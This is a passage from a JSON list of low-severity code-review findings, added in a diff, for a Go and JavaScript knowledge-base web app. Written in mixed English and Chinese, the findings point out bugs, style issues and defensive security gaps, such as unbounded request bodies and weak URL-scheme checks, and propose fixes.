+  "content": "`grep -oP` and `\\K` require GNU grep with PCRE support; on macOS/BSD grep or busybox this fails and, under `set -euo pipefail`, aborts the build with a bare error. The pattern also hard-codes the exact `const Version = \"...\"` spelling, so any refactor of that declaration silently breaks packaging. A POSIX `sed` extraction is portable and equally readable."
+ },
+ {
+  "sev": "low",
+  "cat": "maintainability",
+  "path": "scripts/build.sh",
+  "lines": "18-19",
+  "content": "Building the env prefix from an unquoted `${arm:+GOARM=$arm}` relies on an expansion producing a valid assignment word in command-prefix position (flagged by shellcheck SC2086); quoting it as part of a shellcheck fix would silently turn `GOARM=7` into an argument. Passing the env explicitly via `env` is robust and clearer. Related: only `$1` is inspected for `--all`, so `bash scripts/build.sh -x --all` silently skips the armv7 target."
+ },
+ {
+  "sev": "low",
+  "cat": "security",
+  "path": "internal/api/api.go",
+  "lines": "69-72",
+  "content": "`decodeBody` reads `r.Body` with no size cap, and it backs the unauthenticated `/api/login`, `/api/register` and `/api/setup` endpoints — a multi-GB JSON body is buffered in memory. Wrap the body: `r.Body = http.MaxBytesReader(w, r.Body, 1<<20)` before decoding."
+ },
+ {
+  "sev": "low",
+  "cat": "bug",
+  "path": "internal/api/api.go",
+  "lines": "651-653",
+  "content": "Because an empty value is ignored, an operator can never clear the stored `default_ima_api_key` (same for `ask_api_key` below) — once configured, a leaked/rotated credential cannot be revoked through the API. Treat an explicit empty string as \"clear\" and rely on `nil` (field omitted) to mean \"leave unchanged\"."
+ },
+ {
+  "sev": "low",
+  "cat": "security",
+  "path": "web/ui.js",
+  "lines": "144-144",
+  "content": "`confirmDialog` 的 `message` 参数被当作 HTML 直接拼进 body，但函数名与参数名都不体现这一点，且同函数内的 `title`/`okText` 都做了 `escapeHtml`，容易让调用方误以为 message 也会被转义。目前所有调用点（view-files.js:605、view-home.js:656/1056、view-misc.js:253/539/553/566）确实都自行转义了，但没有约束保证后续不会漏。建议改名为 `messageHtml` 并在 JSDoc 中明确「调用方负责转义」，或提供默认转义 + `allowHtml` 选项。"
+ },
+ {
+  "sev": "low",
+  "cat": "style",
+  "path": "web/ui.js",
+  "lines": "242-242",
+  "content": "这里使用了嵌套三元表达式（`itemId()` 中甚至有四层链式三元），不符合项目的「禁止嵌套三元」约定，可读性差。建议改写为 if/else 赋值。"
+ },
+ {
+  "sev": "low",
+  "cat": "security",
+  "path": "internal/ima/cos.go",
+  "lines": "50-50",
+  "content": "This `IMA_COS_ENDPOINT` override in production code redirects the signed PUT to an arbitrary host while still sending the `Authorization` header, `x-cos-security-token` (live temporary COS credentials) and the file bytes to that host. If this env var is ever set, credentials and content are disclosed to the override endpoint. Prefer removing it or gating it behind a build tag / explicit test-only configuration rather than shipping it in the normal upload path."
+ },
+ {
+  "sev": "low",
+  "cat": "security",
+  "path": "internal/ima/client.go",
+  "lines": "82-82",
+  "content": "On response-parse failure the raw upstream body (truncated) is embedded in the error. These errors are not `*APIError`, so `writeImaErr` surfaces `err.Error()` verbatim to the HTTP client (502), leaking internal/hop-by-hop response details to end users. Additionally `truncate` slices by bytes and can cut a multi-byte UTF-8 rune, producing invalid text. Recommend omitting the raw body from the returned error (log it server-side instead) and truncating on runes if it must be included."
+ },
+ {
+  "sev": "low",
+  "cat": "bug",
+  "path": "internal/api/dashboard.go",
+  "lines": "48-51",
+  "content": "The nil guard here is inconsistent with the rest of the file: `Snapshot()`/`Status()` below and `handleScan` (`s.Scanner.Start()`) dereference `s.Scanner` unconditionally. Either the field is guaranteed non-nil (then drop this check) or it isn't (then all uses need guarding, otherwise `/api/dashboard` and `/api/scan` panic for a `Server` built without a scanner, e.g. in tests or alternate wiring)."
+ },
+ {
+  "sev": "low",
+  "cat": "bug",
+  "path": "internal/api/dashboard.go",
+  "lines": "19-22",
+  "content": "Unparseable/garbage `due` values (boolean, object, array is impossible here but `{}`/`true` are) and malformed JSON silently map to `\"\"`. In `handleUpdateTask` a malformed payload therefore *clears* an existing deadline and reports success instead of rejecting the request, and arbitrary strings are accepted verbatim (later `new Date(due)` in the UI yields `Invalid Date`). Consider returning an error for values that are neither string nor number so callers get a 400."
+ },
+ {
+  "sev": "low",
+  "cat": "bug",
+  "path": "internal/api/download.go",
+  "lines": "144-144",
+  "content": "`strings.TrimSuffix(name, \"\")` is a no-op, so `.txt` is always appended and titles that already have an extension become double-extensioned (e.g. `report.md.txt`). This looks like an unfinished extension-normalization. Use `filepath.Ext(name)` (or drop the call if appending `.txt` is intentional)."
+ },
+ {
+  "sev": "low",
+  "cat": "bug",
+  "path": "internal/api/download.go",
+  "lines": "119-122",
+  "content": "The de-duplication only rewrites a name once and does not re-check the rewritten name, so a later item whose original title is literally e.g. `2_report.md` collides with the renamed `2_report.md` entry, producing duplicate zip entry names. Loop until an unused name is found."
+ },
+ {
+  "sev": "low",
+  "cat": "security",
+  "path": "internal/api/ima_handlers.go",
+  "lines": "496-499",
+  "content": "`url.Parse` only validates syntax; it accepts non-HTTP schemes (`file:`, `javascript:`) and relative URLs, so the \"URL 无效\" check is ineffective. Parse the result and allowlist `http`/`https` with a non-empty host before passing URLs to `ImportURLs`."
+ },
+ {
+  "sev": "low",
+  "cat": "performance",
+  "path": "internal/store/store.go",
+  "lines": "342-342",
+  "content": "Expired sessions are pruned only in `Open`, never at runtime: here an expired entry is reported invalid but left in the map. Over a long uptime `d.Sessions` grows without bound, and since `saveLocked` re-marshals the whole dataset on every mutation, each login/activity write keeps getting more expensive and `data.json` keeps growing (only restarting the process shrinks it). Prune expired entries on the write path, e.g. inside `CreateSession` while the exclusive lock is already held and the save is going to happen anyway."
+ },
+ {
+  "sev": "low",
+  "cat": "bug",
+  "path": "main.go",
+  "lines": "70-70",
+  "content": "The startup log unconditionally prepends `localhost` to `-addr`. That is only correct for the bare `:port` form; the documented example `0.0.0.0:8080` prints `http://localhost0.0.0.0:8080`, and `127.0.0.1:9000` prints `http://localhost127.0.0.1:9000` — an invalid URL shown to the operator. Build the URL from the actual address, adding `localhost` only when the address has no host part."
+ },
+ {
+  "sev": "low",
+  "cat": "maintainability",
+  "path": "scripts/build.sh",
+  "lines": "9-10",
+  "content": "`dist/` is never cleaned, so artifacts of previously built versions stay in the directory and are listed by the final `ls -la` alongside the fresh ones. When several versions are present it is easy to pick up and distribute a stale binary (e.g. `imahub_0.0.9_*` next to `imahub_0.1.0_*`). Clear the output directory (or build into a per-version subdirectory) before building."
+ },
+ {
+  "sev": "low",
+  "cat": "bug",
+  "path": "internal/mcp/mcp.go",
+  "lines": "623-624",
+  "content": "The fallback does not actually support URL-safe input as the comment claims: `base64.RawStdEncoding` rejects `-`/`_`, so only unpadded standard base64 benefits. Use `base64.RawURLEncoding` (and strip `\\r` along with `\\n`) if URL-safe encoding is a requirement."
+ },
+ {
+  "sev": "low",
+  "cat": "maintainability",
+  "path": "web/app.js",
+  "lines": "48-48",
+  "content": "This assignment is dead code: for `#login-theme-btn` (`.btn.icon` with no text) the first branch above already sets `innerHTML = svg`, and every other path through the `if/else` would also produce the same markup (`svg + ''`). Remove the line so the icon assignment isn't duplicated three times in the same loop body."
+ },
+ {
+  "sev": "low",
+  "cat": "maintainability",
+  "path": "web/ui.js",
+  "lines": "371-371",
+  "content": "`cols` is declared but never used in the body, and none of the call sites (`view-files.js:204/338`, `view-notes.js:193/197`) pass a second argument. Remove the unused parameter to keep the helper signature honest."
+ },
+ {
+  "sev": "low",
+  "cat": "bug",
+  "path": "internal/api/dashboard.go",
+  "lines": "267-270",
+  "content": "`Store.DeleteTask` returns either `ErrNotFound` or the persistence error from `saveLocked()` (see internal/store/store.go:459-469). Mapping every error to 404 tells the client \"任务不存在\" even when the entry *was* found and only the disk write failed — in that case the task is already removed from memory, so the UI keeps showing it while a later successful save makes it vanish, and the real cause is dropped entirely (not even logged). Distinguish the sentinel and surface write failures as 500. Same pattern in `handleDeleteEvent` (internal/api/events.go)."
+ },
+ {
+  "sev": "low",
+  "cat": "bug",
+  "path": "internal/api/events.go",
+  "lines": "130-133",
+  "content": "`Store.DeleteEvent` returns `ErrNotFound` *or* the `saveLocked()` error, so a pure persistence failure (disk full/permission) is reported as \"日程不存在\" — the event is already gone from memory but not from disk, and the underlying error is silently discarded. Branch on `errors.Is(err, store.ErrNotFound)` and return 500 for other errors."
+ },
+ {
+  "sev": "low",
+  "cat": "bug",
+  "path": "internal/api/download.go",
+  "lines": "207-214",
+  "content": "Both `UpdateAnnouncement` and `DeleteAnnouncement` report 404 for every error, so a persistence failure (`saveLocked` failing on disk full / permission) is presented to the client as “公告不存在”, even though the in-memory mutation was already applied. Sibling handlers (`handleUpdateEvent`, `handleUpdateTask`, `handleUpdateImaAccount`) distinguish `errors.Is(err, store.ErrNotFound)` from real failures; mirror that contract here (404 only for `ErrNotFound`, otherwise 500/400 with the cause). The delete handler has the same problem."
+ },
+ {
+  "sev": "low",
+  "cat": "bug",
+  "path": "internal/api/ima_handlers.go",
+  "lines": "300-302",
+  "content": "`extForMediaType` is lossy: media_type 9 covers png/jpg/jpeg/webp but always returns `png` (likewise 3 covers doc/docx, 5 xls/xlsx/csv, 15 mp3/m4a/wav/aac). The suffix check only skips appending when the title already ends with the *guessed* extension, so a title like `photo.jpg` becomes `photo.jpg.png`. Because the web UI never sends `title` (web/api.js only passes `media_id`), a JPEG is also served inline with `Content-Type: image/png`. Prefer the extension from the title and only fall back to `extForMediaType` when the name has no extension."
+ },
+ {
+  "sev": "low",
+  "cat": "bug",
+  "path": "internal/auth/auth.go",
+  "lines": "103-103",
+  "content": "The minimum length is measured in bytes, so a 2-character Chinese password (6 bytes) satisfies the documented「密码至少 6 位」rule. Count runes instead (`utf8.RuneCountInString(pw)`); `ValidateUsername` has the same bytes-vs-位 inconsistency."
+ },
+ {
+  "sev": "low",
+  "cat": "bug",
+  "path": "internal/scan/scan.go",
+  "lines": "312-315",
+  "content": "Errors from `GetKnowledgeList` are swallowed with `break`, so a KB (or folder page) that fails mid-traversal is silently under-counted in `AccountStat`/snapshot totals while the scan still reports `done`. Moreover `lastErr` is never assigned anywhere in this file (`s.lastErr = \"\"` is the only write), so `Status().Error` — surfaced as `scan.error` in the dashboard — can never be populated. Propagate the error into `AccountStat.Error` / `s.lastErr` so a partial scan is distinguishable from a complete one."
+ },
+ {
+  "sev": "low",
+  "cat": "maintainability",
+  "path": "web/view-files.js",
+  "lines": "428-428",
+  "content": "These branches can never execute given the current API: `handleImaMedia` returns only `media_type`, `url_info` (`{url, headers}`) and `notebook_ext_info` (`{notebook_id}`), never `title`, `notebook_ext_info.name/create_time` or `url_info.download_url/doc_url`. So the detail dialog never shows a title/notebook info, and the dead code misleads future readers. Either return those fields from the handler or drop the branches."
+ },
+ {
+  "sev": "low",
+  "cat": "bug",
+  "path": "web/view-files.js",
+  "lines": "683-683",
+  "content": "`/api/ima/import-urls` returns `results` as an object map keyed by URL (`{url, ret_code, media_id}`), so `Array.isArray(results)` is always false: `okCount` is always `urls.length` and per-link failures (`ret_code != 0`) are reported to the user as a successful import. Iterate `Object.values(results)` and check `ret_code === 0`."
+ },
+ {
+  "sev": "low",
+  "cat": "bug",
+  "path": "web/view-home.js",
+  "lines": "215-215",
+  "content": "The modal is appended to `#modal-root` but the result containers are looked up with unscoped global ids, and `showModal(...)`'s return value is discarded. If the ask dialog is closed and reopened (or another modal is open) before this promise resolves, the previous question's answer is written into the currently open dialog. Capture `const m = showModal(...)` and query inside `m.root`."
+ },
+ {
+  "sev": "low",
+  "cat": "bug",
+  "path": "web/view-misc.js",
+  "lines": "610-610",
+  "content": "Unlike `ask_api_key` above (which is `.trim()`ed), this value is sent raw. The backend treats only `\"\"` as \"keep current\" and then trims, so an accidental whitespace-only value passes the `!= \"\"` check and is stored as empty — silently wiping the configured default IMA API key while the form still says \"已设置\". Trim before sending."
+ },
+ {
+  "sev": "low",
+  "cat": "style",
+  "path": "web/view-home.js",
+  "lines": "596-596",
+  "content": "Nested ternary for the badge class (also `done ? 'ok' : t.status === 'doing' ? '' : 'muted'`), which the project style prohibits. Extract a small helper/const (`taskStatusClass(status)`) so the `done`/`doing`/`todo` mapping is stated once instead of being duplicated in the meta row and easy to get wrong."
+ },
+ {
+  "sev": "low",
+  "cat": "bug",
+  "path": "web/view-files.js",
+  "lines": "279-279",
+  "content": "A single `click` already calls `enterFolder(it)`, so this `dblclick` listener is redundant. It also means a double-click can enqueue a second `enterFolder` while `loadList` is in flight: that call mutates `filesState.folder`/`filesState.path` again and pushes a duplicate breadcrumb entry, after which `loadList(true)` returns early (same class of race as the `filesState.loading` guard). Drop the `dblclick` handler and keep only the click one."
+ },
+ {
+  "sev": "low",
+  "cat": "maintainability",
+  "path": "web/view-notes.js",
+  "lines": "36-36",
+  "content": "This button is rendered with `hidden` and no code ever removes that class (bucketing the click handler in `bindNotesEvents` only). The “返回列表” control is therefore unreachable dead UI/code — either toggle it from `renderNotesList()` when `notesState.searchMode` is true, or remove it and the handler."
+ },
+ {
+  "sev": "low",
+  "cat": "bug",
+  "path": "web/view-home.js",
+  "lines": "183-183",
+  "content": "This depends on a hardcoded 250 ms delay plus a pre-existing `filesState.kb`. On first use (`filesState.kb === null`) the modal never opens — the user just gets “请先选择一个知识库” after the page has already navigated. Trigger the import flow from the files view once it is ready (e.g. set a pending flag consumed by `renderFilesView`/`selectKb`), and skip the magic timeout."
+ }
+]
